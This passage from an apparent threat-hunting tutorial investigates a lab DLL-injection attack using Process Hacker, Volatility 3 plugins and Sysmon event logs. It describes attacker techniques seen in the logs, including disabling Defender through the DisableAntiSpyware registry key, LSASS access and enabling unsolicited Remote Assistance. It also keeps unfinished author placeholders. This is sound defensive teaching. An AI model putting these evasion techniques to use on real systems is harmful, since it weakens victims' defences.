<p>We can see under <code>Start address</code> that it is mapped, meaning it does exist on disk. This essentially tells us that this is <em>not</em> a Reflectively Loaded DLL, since we would expect that to have an unknown address listed as <code>0x0</code>.</p>
<ol start="6">
<li><strong>Memory Permissions</strong></li>
</ol>
<p>On the top of the Properties window select <code>Memory</code>. Now click once on the <code>Protection</code> header to sort it. Scroll down until you see <code>RWX</code> permissions.</p>
<figure class="custom-figure-3"><img src="/img/image056.png"/>
</figure>

<p>Indeed we see the presence of two memory spaces with <strong>Read-Write-Execute</strong> permissions, which as we learned is always suspicious since there are very few legitimate programs that will write to memory and then immediately execute it.</p>
<ol start="7">
<li><strong>Memory Content</strong></li>
</ol>
<p>Finally let&rsquo;s double-click on the larger of the two (172 kB) since this typically represents the payload.</p>
<figure class="custom-figure"><img src="/img/image057.png"/>
</figure>

<p>We immediately see the two clear giveaways that we are dealing with a PE file. We can see the magic bytes (<code>MZ</code>), and we see the strings we associate with a PE Dos Stub - <code>This program cannot be run in DOS mode</code>. Again, another point for &ldquo;team sus&rdquo;.</p>
<p>That&rsquo;s it for our live memory analysis: feel free to exit Process Hacker. Let&rsquo;s discuss our results before moving on to our post-mortem analysis.</p>
<hr>
<h1 id="44-final-thoughts">4.4 Final Thoughts</h1>
<p>Let&rsquo;s briefly review what we learned in this second live analysis using <code>Process Hacker</code>.</p>
<figure class="custom-figure-2"><img src="/img/review.gif"/>
</figure>

<p>We came into this with a few basic breadcrumbs we picked up in our live analysis using the native tools:</p>
<ul>
<li>A process, <code>rundll32.exe</code>, created an unusual outbound connection.</li>
<li>This process had an unexpected parent process, <code>rufus.exe</code>.</li>
<li>The process was ran without the command-line arguments we would expect it to have.</li>
</ul>
<p>This thus then set us off to dig deeper into this unusual process using <code>Process Hacker</code>:</p>
<ul>
<li><code>rundll32.exe</code> itself spawned <code>cmd.exe</code> - very suspicious.</li>
<li><code>rundll32.exe</code> was ran from the desktop - unusual.</li>
<li>The process also had <code>RWX</code> memory space permissions, which is a big red flag.</li>
<li>We saw that the memory content of the <code>RWX</code> memory space contained a PE file - again, red flag.</li>
</ul>
<p>This signifies the end of our <em><strong>live analysis</strong></em>, ie analysis we perform with the suspicious process still being active. We&rsquo;ll now move onto <em><strong>post-mortem analysis</strong></em> to see what else we can learn from the suspicious process.</p>
<p><strong>At this point keep your Windows VM on, shut down your Kali VM, and turn on your Ubuntu VM.</strong></p>
<hr>
<hr>
<h1 id="5-post-mortem-forensics-memory">5. Post-Mortem Forensics: Memory</h1>
<h1 id="51-transferring-the-artifacts">5.1. Transferring the Artifacts</h1>
<p>First thing&rsquo;s first - we need to transfer the artifacts we produced in <code>2.3.6</code> over to our Ubuntu analyst VM.</p>
<figure class="custom-figure-2"><img src="/img/review.gif"/>
</figure>

<p>But just as a note: we&rsquo;ll only transfer our memory dump and packet capture. We won&rsquo;t transfer our log files - I&rsquo;ll explain exactly why later.</p>
<p>Ok so there are a number of ways we can transfer our files over, and if you have your own method you prefer please go ahead. I&rsquo;m going to opt for using <code>Python3</code> to quickly spin up a simple http server. For simplicity sake ensure both files (<code>dllattack.pcap</code> and <code>memdump.raw</code>) are located in the same directory, in my case they are both on the desktop.</p>
<p><strong>So let&rsquo;s go ahead and do it:</strong></p>
<ol>
<li>First download the <code>Python3</code> installer for Windows <a href="https://www.python.org/downloads/windows/">here</a>.</li>
<li>Then run the installer, all default selections.</li>
<li>Once it&rsquo;s done open an administrative <code>Command Prompt</code> and navigate to the desktop.</li>
<li>We can now create our <strong>http server</strong>.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -m http.server 8008
</span></span></code></pre></div><ol start="5">
<li>You will more than likely receive a Windows Security Alert, click <code>Allow Access</code>.</li>
</ol>
<figure class="custom-figure-3"><img src="/img/image058.png"/>
</figure>

<ol start="6">
<li>Now head on over to your Ubuntu analyst VM and open the browser (FireFox). Navigate to <code>http://windows_IP:windows_port</code>, in my case that would be <code>http://192.168.230.158:8008</code>.</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image061.png"/>
</figure>

<ol start="7">
<li>Go ahead and save each of the files to wherever you want - for simplicity&rsquo;s sake I will be saving them all directly to the desktop once again.</li>
</ol>
<hr>
<h1 id="52-introduction-to-volatility">5.2. Introduction to Volatility</h1>
<p>For our post-mortem analysis we&rsquo;ll be using <code>Volatility V3</code>. If you&rsquo;d like to know more <a href="https://volatility3.readthedocs.io/en/latest/">check out its excellent documentation.</a></p>
<p>One important thing you have to know before we move ahead is that <code>Volatility</code> uses a modular approach. Each time you run it you have to specify a specific plug-in, which performs one specific type of analysis.</p>
<p><strong>So for example here are the plug-ins we&rsquo;ll use and their associated functions:</strong></p>
<ul>
<li><code>pslist</code>, <code>pstree</code>, and <code>psinfo</code> all provide process info.</li>
<li><code>handles</code> shows us all the handles associated with a specific process.</li>
<li><code>cmdline</code> shows  the command prompt history.</li>
<li><code>netscan</code> displays any network connections and sockets made by the OS.</li>
<li><code>malfind</code> looks for inject code.</li>
</ul>
<figure class="custom-figure-3"><img src="/img/plugging-in.gif"/>
</figure>

<p>Now that you have a basic idea of the modules we&rsquo;ll be using, let&rsquo;s continue with our actual analysis.</p>
<hr>
<h1 id="53-analysis">5.3. Analysis</h1>
<h1 id="531-pslist-pstree-and-psinfo">5.3.1. pslist, pstree, and psinfo</h1>
<p>Two of the most common plugs-ins are <code>pslist</code> and <code>pstree</code>. The former gives us a list of all processes with some key details, <code>pstree</code> conversely will also show Parent-Child relationships. Since we&rsquo;ve already seen this info multiple times now we&rsquo;ll skip it here, but I wanted be aware that, if for whatever reason you were not able to perform the live analysis, you can gather all the same important process information from the memory dump using <code>Volatility</code>.</p>
<p>Let&rsquo;s quickly run another module, <code>psinfo</code>, to break the ice and remind ourselves of the PID, which we&rsquo;ll need for some of the other plugins.</p>
<ol>
<li>Open a terminal and navigate your your main Volatility3 directory, in my case it is <code>/home/analyst/Desktop/volatility3</code>.</li>
<li>Let&rsquo;s run our <code>psinfo</code> plugin using the following command:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/memdump.raw windows.pslist 
</span></span></code></pre></div><ol start="3">
<li>Scroll down until you see <code>rundll32.exe</code> and note it&rsquo;s PID, you can see in my example below it&rsquo;s <code>5060</code>, we&rsquo;ll use this for our next plug-in.</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image062.png"/>
</figure>

<h1 id="532-handles">5.3.2. handles</h1>
<p>Now that we&rsquo;ve got the PID of our suspicious program we&rsquo;re going to look at its handles.</p>
<figure class="custom-figure-3"><img src="/img/handles.gif"/>
</figure>

<p>A handle is like a reference that a program uses to access a resource - whether that be files, registry keys, or network connections. When a process wants to access one of these resources, the OS gives it a handle, kind of like a ticket, that the process uses to read from or write to the resource.</p>
<p>For threat hunting it&rsquo;s a great idea to look at the handles of any process you consider suspect since it will give us a lot of information about what the process is actually doing. For instance, if a process has a handle to a sensitive file or network connection that it shouldn&rsquo;t have access to, it could be a sign of malicious activity. By examining the handles, we can get a clearer picture of what the suspicious process is up to, helping us to understand its purpose and potentially identify the nature of the threat.</p>
<p>Now to be frank this analysis of handles can be a rather complex endeavour, relying on a deep technical understanding of the subject. So I&rsquo;ll show how it works, and of course provide some insight on the findings, but be aware that I won&rsquo;t be able to do an exhaustive exploration of this topic as that could be a multi-hour course in and of itself.</p>
<p>Let&rsquo;s run the <code>windows.handles</code> plugin with the following command, including the PID of <code>rundll32.exe</code> as we just learned.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060
</span></span></code></pre></div><p>We see a large number of output, too much to meaningfully process right now. However what immediately sticks out is <code>Key</code> - meaning registry keys. So let&rsquo;s run the same command but utilize <code>grep</code> to only see all handles to registry keys:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060 | grep Key
</span></span></code></pre></div><p>We can see  the results in the image below:</p>
<figure class="custom-figure"><img src="/img/image063.png"/>
</figure>

<p>Again, as has been the case before: nothing here is inherently indicative of malware. However, in the case where we suspect something of being malware, many of these registry key handles are commonly absed by malware.</p>
<p><strong>For example:</strong></p>
<p><code>MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\IMAGE FILE EXECUTION OPTIONS</code>:
This key is commonly used to debug applications in Windows. However, it is also used by some malware to intercept the execution of programs. Malware can create a debugger entry for a certain program, and then reroute its execution to a malicious program instead.</p>
<p><code>MACHINE\SYSTEM\CONTROLSET001\CONTROL\NLS\SORTING\VERSIONS</code>: This key is related to National Language Support (NLS) and the sorting of strings in various languages. It&rsquo;s uncommon for applications to directly interact with these keys. If the process is modifying this key, it may be an attempt to affect system behavior or mask its activity.</p>
<p><code>MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\HWORDER and MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\PROVIDERORDER</code>: These keys are related to the order in which network providers are accessed in Windows. Modification of these keys may indicate an attempt to intercept or manipulate network connections.</p>
<h1 id="533-cmdline">5.3.3. cmdline</h1>
<p>This is one of my favourite modules in Volatility, allowing us to extract command-line arguments of running processes from our memory dump. Here we&rsquo;ll apply it only to the process of interest, but of course keep in mind that we could review the entire available history.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.cmdline.CmdLine --pid 5060 
</span></span></code></pre></div><figure class="custom-figure-3"><img src="/img/image096.png"/>
</figure>

<p>Here we receive the same insight as before, namely that <code>rundll32.exe</code> was not provided any arguments when it was invoked from the command line. I&rsquo;m pointing this out once again so you are aware you can obtain this same information even if you were not able to perform a live analysis.</p>
<h1 id="534-netscan">5.3.4. netscan</h1>
<p>The <code>netscan</code> plugin will scan the memory dump looking for any network connections and sockets made by the OS.</p>
<p>We can run the scan using the command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.netscan
</span></span></code></pre></div><p>REDO THIS SECTION POINT OUT SAME IP WE FOUND WITH NATIVE TOOLS</p>
<h1 id="535-malfind">5.3.5. malfind</h1>
<p><code>malfind</code> is the quintessential plugin for, well, finding malware. The plugin will look for suspected inject code, which it determines based on header info - indeed much like we did manually during our live analysis when we look at the memory space content.</p>
<p>We can run it with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.malfind
</span></span></code></pre></div><p>Below is a sample of the result, which is quite extensive:</p>
<figure class="custom-figure"><img src="/img/image064.png"/>
</figure>

<p>We can see that it correctly flagged <code>rundll32.exe</code>. However, if we go through the entire list we can see a number of false positives:</p>
<ul>
<li>RuntimeBroker.exe</li>
<li>SearchApp.exe</li>
<li>powershell.exe</li>
<li>smartscreen.exe</li>
</ul>
<p>This is thus a good reminder that the mere appearance of a process in malfind&rsquo;s output is not an unequivocal affirmation of its malicious nature.</p>
<hr>
<h1 id="54-final-thoughts">5.4. Final Thoughts</h1>
<p>This section was admittedly not too revelatory, but really only because we already peformed live analysis. Again, if we were unable to perform live analysis and only received a memory dump, then this section showed us how we could derive a lot of the same information. Further, even if we did perform the live analysis, it might still be useful to validate the findings on a system not suspected of being compromised.</p>
<p>we bolster our case when we can come to the same conclusions via another avenue.</p>
<p>I think this serves as a good introduction to <code>Volatility</code> - you now have some sense of how it works, how to use it, and what are the &ldquo;go to&rdquo; plug-ins for threat hunting.</p>
<figure class="custom-figure"><img src="/img/office.gif"/>
</figure>

<p>That being the case let&rsquo;s move on to the log analysis, which is likely going to be the most substantial journey. For this we&rsquo;ll once again use our Windows VM, so in case you turned it off, please turn it back on.</p>
<hr>
<hr>
<h1 id="6-post-mortem-forensics-log-analysis">6. Post-Mortem Forensics: Log Analysis</h1>
<h1 id="61-introduction">6.1. Introduction</h1>
<p>Now typically we might think of logging as belonging more to the realm of the SOC than a threat hunter. That&rsquo;s because, at least in the way that modern logging practices operate, logging is not seen as something directly approachable by a human operator.</p>
<figure class="custom-figure-2"><img src="/img/mentat.gif"/>
</figure>

<p>What do I mean by this? One consequence of the &ldquo;endpoint arm&rsquo;s race&rdquo; that vendors have taken the industry on is the unimaginable scale of the data being generated. It&rsquo;s not unusual for an enterprise to generate millions of log events in their SIEM <em>daily</em>. Given that, the notion that a person can start prodding around <em>sans</em> &ldquo;alert filter&rdquo; seems laughable.</p>
<figure class="custom-figure"><img src="/img/needle.gif"/>
</figure>

<p>Intuitively, this &ldquo;scale incompatibility&rdquo; problem makes sense, however, based on context there is some further nuance to consider.</p>
<p>First, as I emphasized in my article <a href="https://www.faanross.com/posts/three_modes/">&ldquo;Three Modes of Threat Hunting article&rdquo;</a>, log analysis is typically not the best choice for the initial phase of a threat hunt, but it can be a crucial part of the follow-up. Just as we are about to do here, if we already have a sense of limited scope — such as specific processes, time stamps, events, etc. — we need not approach <em>all</em> logs; instead, we can focus on a specific set of logs.</p>
<p>But it gets better: before we even apply our own filtering criteria, we won&rsquo;t really ever consider the entire body of potential logs to begin with since most of it is, well&hellip;</p>
<figure class="custom-figure"><img src="/img/poop.gif"/>
</figure>

<p>When it comes to threat hunting + log analysis, I think of the approach more akin to the <code>Pareto Principle</code>. The Pareto Principle states that in most systems 80% of outputs result from 20% of inputs.</p>
<p>Contextually applied here - 20% of the logs will account for 80% of potential adverse security events. But in honesty, the proportion here is likely even more extreme - this is a complete guess, but I&rsquo;d say it&rsquo;s more like <em><strong>5% of logs will potentially account for 95% of adverse security events</strong></em>.</p>
<p>So, instead of focusing on 100% of the logs to potentially uncover 100% of the adverse security events, we&rsquo;ll focus on about 5% of the logs to potentially uncover 95% of the adverse security events. What exactly constitutes that &ldquo;5%&rdquo; will become progressively more nuanced as we continue on our journey in future courses, but for now it simply means that we focus on <code>Sysmon</code> and <code>PowerShell ScriptBlock</code> logs while ignoring WEL completely.</p>
<figure class="custom-figure"><img src="/img/ignore.gif"/>
</figure>

<hr>
<h1 id="62-a-quick-note">6.2. A Quick Note</h1>
<p>We will be using the same Windows VM (ie the victim) to perform the log analysis in this section. Note that this is done purely for the sake of convenience. As of my current understanding (please <a href="mailto:faan@teonan.com">tell me</a> if I&rsquo;m wrong), there is no simple way to interact with <code>.evtx</code> files in Linux, at least not in the GUI.</p>
<p><em>Yes, yes</em> - I am well aware it&rsquo;s very uncool to prefer use of a GUI, <em>totally</em> not 1337 and stuff. But if you&rsquo;d be so kind, please allow me a momentary expression of nuance: both the command line and GUI have their strengths and weaknesses and better to select the best based on context than to succumb to dogma.</p>
<figure class="custom-figure-3"><img src="/img/dogma.gif"/>
</figure>

<p>So for now it&rsquo;ll just be simpler to move ahead and used the built-in <code>Event Viewer</code> in Windows to work with these files. And since I did not want to create another &ldquo;non-victim&rdquo; Windows VM for this one task we&rsquo;re going to be using the same VM. But please be aware, unless there is literally no alternative you should never do this in an actual threat hunting scenario.</p>
<p>The reason is quite obvious - performing a post-mortem analysis on a compromised system can potentially taint the results. We have no idea how the breach might be impacting our actions and so to ensure the integrity of our data we need to perform it in a secure environment.</p>
<figure class="custom-figure-3"><img src="/img/tainted.gif"/>
</figure>

<p>This also why for example certain antimalware software vendors provide versions of their products that can run directly from a bootable CD or USB drive - to ensure a scan that is unaffected by  resident malware.</p>
<p>So that cavaeat out of the way, <em>let&rsquo;s get it on</em> with Sysmon.</p>
<figure class="custom-figure"><img src="/img/getiton.gif"/>
</figure>

<hr>
<h1 id="63-sysmon">6.3. Sysmon</h1>
<h1 id="631-theory">6.3.1. Theory</h1>
<p>So we&rsquo;ve installed Sysmon (<code>1.5.4.</code>), enabled it, captured logs with it, and then exported those logs as an <code>.evtx</code> file (<code>2.3.6.</code>). But we&rsquo;ve not really discussed why we&rsquo;ve done any of this. Why don&rsquo;t we simply rely on the default <code>Windows Event Logs</code>  (<code>WEL</code>), why go through the additional effort of setting <code>Sysmon</code> up?</p>
<p>Well, without pussyfooting around let me just give it to you straight - <code>WEL SUCKS. REAL BAD.</code></p>
<figure class="custom-figure"><img src="/img/rubbish.gif"/>
</figure>

<p>In stark contrast, <code>Sysmon</code>, created by living legend <a href="https://twitter.com/markrussinovich">Mark Russinovich</a>, takes about 5 minutes to set up and will <em>dramatically</em> improve logging as it relates specifically to security events.</p>
<p>That&rsquo;s really about all you need to know at this point - WEL bad, Sysmon epic. But in case you wanted to learn more about Sysmon&rsquo;s ins and outs <a href="https://www.youtube.com/watch?v=6W6pXp6EojY">see this talk</a>. And if you really wanted to get in deep, which at some point I recommend you do, see <a href="https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7">this playlist</a> from TrustedSec. Finally here is another great talk by Eric Conrad on <a href="https://www.youtube.com/watch?v=7dEfKn70HCI">using Sysmon for  Threat Hunting</a>.</p>
<hr>
<h1 id="632-analysis">6.3.2. Analysis</h1>
<p>In case it&rsquo;s off, switch on your Windows VM. I saved the <code>.evtx</code> export we performed earlier on the desktop, let&rsquo;s simply double-click on it, which will open it in <code>Event Viewer</code>. We can immediately see there are 34 recorded events.</p>
<p>SHOULD BE AN IMAGE OF THIS HERE TO HELP ORIENT READER.</p>
<p>If you recall, right before we launched the attack we actually cleared the Sysmon logs. So one would expect right after you clear something you start with 0, but here the very act of clearing the log is immediately logged in the new log. This is done for obvious security reasons, and as a consequence we start anew with 2 log entries.</p>
<p>This means of course that the actual event produced a maximum of 32 event logs. I say a maximum because it&rsquo;s likely something else could have generated a log entry - we&rsquo;ll find out soon enough.</p>
<p>Now with logs, especially a small-ish set like we have here, I always like starting off by looking at everything at a high level. Let&rsquo;s see if we can see any interesting trends or patterns.</p>
<figure class="custom-figure"><img src="/img/image080.png"/>
</figure>

<p>The first thing we notice is we have a number of different event IDs - <code>1</code>, <code>3</code>, <code>5</code>, <code>10</code>, <code>12</code>, <code>13</code>, and <code>22</code>.</p>
<p>Now each of these represent a specific category event. I&rsquo;m not going to hamstring us by reviewing them all here now, instead if you&rsquo;d like, check this <a href="https://www.blackhillsinfosec.com/a-sysmon-event-id-breakdown/">awesome overview by our friends from Black Hills Infosec</a>. I recommend reviewing each of them briefly.</p>
<p>So as I said, we can ignore our first two event entries since we know they are related to clearing the logs. Then, looking at the <code>Date and Time</code> stamp and thinking in terms of &ldquo;event clusters&rdquo;, we can guess that the next two entries are probably not part of our attack. We can see that they form their own little time cluster, and then starting with the fifth entry(<code>ID 22: DNS</code>), we can see a time cluster in which nearly all the events happen. This is likely where the action is, so let&rsquo;s start there.</p>
<figure class="custom-figure"><img src="/img/image081.png"/>
</figure>

<p>We can see that PowerShell is performing a DNS request for the FQDN <code>raw.githubusercontent.com</code>. This is of course a result of the IEX-command we ran which downloaded the script from the web server before injecting it into memory.</p>
<p>And so take a moment to think of what this means - when an attacker uses a stager, and as is mostly the case that stager then initially goes out to a web server to retrieve another script (ie the payload), there will be DNS footprint. Thus DNS, for this reason and others we&rsquo;ll discuss in the future, is always an important dimension to dig into when threat hunting C2.</p>
<figure class="custom-figure-3"><img src="/img/bobs.gif"/>
</figure>

<p>There is a caveat here - DNS resolution only occurs if the web server the stager reaches out to is specified as a FQDN and not an IP. In the command we ran we instructed it to reach out to <code>raw.githubusercontent.com</code> (FQDN), and not for example to <code>101.14.18.44</code>, hence DNS resolution and a Sysmon event ID 22 occurred.</p>
<p>From the malware author&rsquo;s POV, there are pro&rsquo;s and cons to taking either approach. So it&rsquo;s good to be aware that the stager may, or may not, produce a DNS &ldquo;receipt&rdquo;. What&rsquo;s always going to be present however is what we see in the subsequent entry (<code>ID 3</code>).</p>
<figure class="custom-figure-3"><img src="/img/image081.png"/>
</figure>

<p>This entry is a record of the actual network connection between the victim and the server. This is great for us since we can always expect to find such a log entry, and it will provide us with both the IP as well as hostname of the server where the script was pulled from. We can then obviously task someone to reference it in any databases of known malicious IOCs.</p>
<p>Additionally, we can see here that <code>powershell.exe</code> is the program responsible for creating the connection. Now if we imagine this was an actual event where a user unwittingly opened a malicious Word document (<code>.docx</code>), you might guess that we&rsquo;d see <code>winword.exe</code> instead of <code>powershell.exe</code>. But not so - since <code>winword.exe</code> cannot itself initiate a socket connection we would indeed most likely see <code>powershell.exe</code> (or something else) responsible for the network connection.</p>
<p>Further, on a &ldquo;regular&rdquo; user&rsquo;s station we&rsquo;d mostly expect to see outside network connections created by the browser, email client, and a variety of Windows processes (backend communcation with MS). We would not however, in most situations, expect to see <code>powershell.exe</code> creating them. Note there are potential exception to this, and of course if the system belongs to an administrator then this would be quite normal.</p>
<figure class="custom-figure"><img src="/img/itcrowd.gif"/>
</figure>

<p>We can ignore the next 2 entries (<code>smartscreen.exe, ID 1</code>, <code>consent.exe, ID 1</code>), but immediately after that we see the process creation for <code>rufus.exe</code>. As I mentioned earlier - since an actual attacker will almost certainly inject into an existing process this log is pragmatically irrelevant.</p>
<p><strong>We then again encounter a few other Windows services we can also ignore for now:</strong></p>
<ul>
<li>vdsldr.exe <code>ID 1</code>,</li>
<li>svchost.exe <code>ID 10</code>,</li>
<li>vds.exe <code>ID 1</code></li>
</ul>
<figure class="custom-figure-2"><img src="/img/interesting.gif"/>
</figure>

<p>We then encounter a series of three <strong>very interesting</strong> logs - <code>ID 13</code>, <code>ID 12</code>, <code>ID 13</code>. These are really awesome since, as you&rsquo;ll soon see, they give us insight into an inner workings of the malware.</p>
<p>The first of the three entries (<code>ID 13</code>) is shown below.</p>
<figure class="custom-figure-3"><img src="/img/image082.png"/>
</figure>

<p>We can see that <code>rufus.exe</code>, a program that supposedly is used for the sole purpose of creating bootable USB drives, has modified a Windows registry key. This is obviously quite strange, even more so if we look at the name of the actual key we can see it ends with <code>DisableAntiSpyware</code>.</p>
<p>Further, we can see the value has been set to 1 (<code>DWORD (0x00000001)</code>). Now a value of 1 actually means &rsquo;enable&rsquo;, but since the registry key <code>DisableAntiSpyware</code> is a double negative, by enabling it you are in effect disabling the actual antispyware function.</p>
<p>So of course this was not <code>rufus.exe</code>, but the malware that&rsquo;s injected into it performing these actions. It is in effect turning off a feature of MS Defender&rsquo;s antispyware functionality, which is fairly common behaviour for malware.</p>
<p>The next log entry (<code>ID 12</code>) indicates that a deletion event has occurred on a registry key.</p>
<figure class="custom-figure-3"><img src="/img/image083.png"/>
</figure>

<p>We can see the registry key has the same name as above (<code>DisableAntiSpyware</code>), <em>but</em>, critically, we have to pay attention to the full path of the <em>TargetObject</em>. The first one is located under <code>HKU\...</code>, while the one here is located under <code>HKLM\...</code>. <code>HKU</code> stands for <em><strong>HKEY_USERS</strong></em>, and <code>HKLM</code> stands for <em><strong>HKEY_LOCAL_MACHINE</strong></em>. These are two major registry hive keys in the Windows Registry.</p>
<p>What you should also know is that the <code>HKU</code> hive contains configuration information for Windows user profiles on the computer, whereas the <code>HKLM</code> hive contains configuration data that is used by all users on the computer. In other words the first one deals with the specific user, the second deals with the entire system.</p>
<p>Further, we can also see that instead of <code>rufus.exe</code> performing the actions here, it is performed by <code>svchost.exe</code>. In case you were not aware this is a legitimate Windows process, and further, it being co-opted for nefarious purposes by malware is quite common. That&rsquo;s because hackers LOVE abusing <code>svchost.exe</code> for a slew of reasons - its ubiquity, anonymity, persistence, stealth and potential for gaining elevated privileges.</p>
<figure class="custom-figure-3"><img src="/img/brent.gif"/>
</figure>

<p>And in fact it seems this might be the primary reason for the malware switching processes - changes to <code>HKLM</code> require elevated privileges because they affect the entire system, not just a single user. The <code>svchost.exe</code> process was running with system privileges (the highest level of privilege), which allowed it to modify the system-wide key.</p>
<p>Ok before we fully get stuck into this let&rsquo;s review the last entry since we need to see the entire picture before we can attempt to make sense of it.</p>
<figure class="custom-figure"><img src="/img/image084.png"/>
</figure>

<p>Here we can see the same action as performed in our first entry, ie disabling the antispyware function by setting the value to 1 (disabling through enabling the disabling function - thanks MS!). But this time it affects the <code>HKLM</code> hive instead of the <code>HKU</code> hive. In other words, where the first entry disabled antispyware for the specific user, this now disables it for the entire system.</p>
<p>But then why the deletion event preceding this? The most likely reason the malware is doing this is to ensure that by returning the registry key to the default state (which is what deleting it in effect does), it will behave exactly as is expected. In this way it ensures that the system doesn&rsquo;t have an unexpected configuration that could interfere with the malware&rsquo;s actions.</p>
<p>This is of course speculation on my part - the only way for us to truly understand the malware author&rsquo;s intention would be to actually reverse it, which is of course literally an entire other discipline in and of itself.</p>
<p>That being the case this is where our speculation on this matter will remain, we will however be jumping into the amazing world of malware analysis in the future. As a threat hunter you are not expected to be an absolute wizard at it, but your abilities as a hunter will expand dramatrically if you add a basic understanding of this tool to your kit.</p>
<p>But for now, let&rsquo;s move on.</p>
<figure class="custom-figure"><img src="/img/silly_walk.gif"/>
</figure>

<p>Following this  we see a handful of events with <code>ID 10</code>, followed by another series of events all with <code>ID 1</code>.</p>
<figure class="custom-figure"><img src="/img/image085.png"/>
</figure>

<p>We can see they all involve <code>svchost.exe</code>, giving us the sense that this might once again be the malware. Fully interpreting and making sense of these event logs is however beyond the scope of this course, so for now we&rsquo;ll pass.</p>
<p>Next we encounter another DNS resolution entry (<code>ID 22</code>), this one is however a little bit more befuddling than our original DNS log.</p>
<figure class="custom-figure-3"><img src="/img/image086.png"/>
</figure>

<p>Here we can see <code>svchost.exe</code> (let&rsquo;s still assume this is the malware) is doing a DNS query for  DESKTOP-UKJG356. This is however the name of the very host it currently compromised. So why would malware do this - why would it do a DNS resolution to find the ip of the host it has currently infected?</p>
<p>Well, there are several potential reasons. One possible explanation is that it is doing internal fingerprinting, it might also for example be testing network connectivity to check whether it is in a sandboxed environment - in which case it will alter its behaviour. These are again educated guesses, and as was the case above we&rsquo;ll have to dig into its guts to really understand what it&rsquo;s intention is.</p>
<p>Next we can see some events (<code>ID 10</code>) where <code>powershell.exe</code> is accessing <code>lsass.exe</code>.</p>
<figure class="custom-figure"><img src="/img/image087.png"/>
</figure>

<p><code>LSASS</code>, or the Local Security Authority Subsystem Service, is a process in Microsoft Windows operating systems responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. Given its involvment in security and authentication it&rsquo;s probably no great shock to learn that hackers LOVE abusing this process. It is involved in a myriad of attack types - credential dumping, pass-the-hash, pass-the-ticket, access token creation/manipulation etc.</p>
<figure class="custom-figure-3"><img src="/img/troll.gif"/>
</figure>

<p>We can see in the log entry the GrantedAccess field is set to <code>0x1000</code>, which corresponds to <code>PROCESS_QUERY_LIMITED_INFORMATION</code>. This means the accessing process has requested or been granted the ability to query certain information from the <code>LSASS</code> process. Such information might include the process&rsquo;s existence, its execution state, the contents of its image file (read-only), etc. Given the context, this log could indicate potential malicious activity, such as an attempt to dump credentials from <code>LSASS</code> or a reconnaissance move before further exploitation.</p>
<p>And then finally we see two events with <code>ID 1</code>, the first of which is another crucial piece of evidence indicative of malware activity.</p>
<figure class="custom-figure"><img src="/img/image088.png"/>
</figure>

<p>Here we can see the Windows Remote Assistance COM Server executable (<code>raserver.exe</code>) has been launched. This tool is used for remote assistance, which allows someone to connect to this machine remotely to assist with technical issues.</p>
<p>The flag <code>/offerraupdate</code> used in the CommandLine for <code>raserver.exe</code> suggests that it was started to accept unsolicited Remote Assistance invitations. This allows remote users to connect without needing an invitation. This Remote Assistance tool can provide an attacker with a remote interactive command-line or GUI access, similar to <code>Remote Desktop</code>, which can be used to interact with the system and potentially exfiltrate data.</p>
<p>And then in the last event log we can see our old friend <code>rundll32.exe</code> - the suspicious process we first encountered way back in the beginning when we looked at unusual network connections. This was of course what set us down this path of threat hunting in the first place.</p>
<figure class="custom-figure"><img src="/img/image088.png"/>
</figure>

<p>And we learn the same things we&rsquo;ve seen now a couple of times in our memory forensics analysis - the process was invoked without arguments, the process was started from an unusual location (desktop), and that the parent process is <code>rufus.exe</code>.</p>
<p>That&rsquo;s it for <code>Sysmon</code>, let&rsquo;s jump straight into <code>PowerShell ScriptBlock</code> logs and then we&rsquo;ll discuss all the results in unison.</p>
<hr>
<p> </p>
<h1 id="64-powershell-scriptblock">6.4. PowerShell ScriptBlock</h1>
<h1 id="641-analysis">6.4.1. Analysis</h1>
<p>In Section <code>2.3.6</code> we exported the PowerShell ScriptBlock logs to desktop, let&rsquo;s now go ahead and open it in <code>Event Viewer</code> by double-clicking on the file.</p>
<p>HERE SHOW IMAGE OF OVERVIEW</p>
<p>We can immediately see that 15 events were logged in total. As was the case with Sysmon, the first two entries are artifacts from clearing the logs immediately prior to running our attack. Thus in total our attack resulted in 13 log entries.</p>
<p>So again let&rsquo;s first look at everything on a high-level to see what patterns we can identify, a few things immediately stand out.</p>
<figure class="custom-figure"><img src="/img/image089.png"/>
</figure>

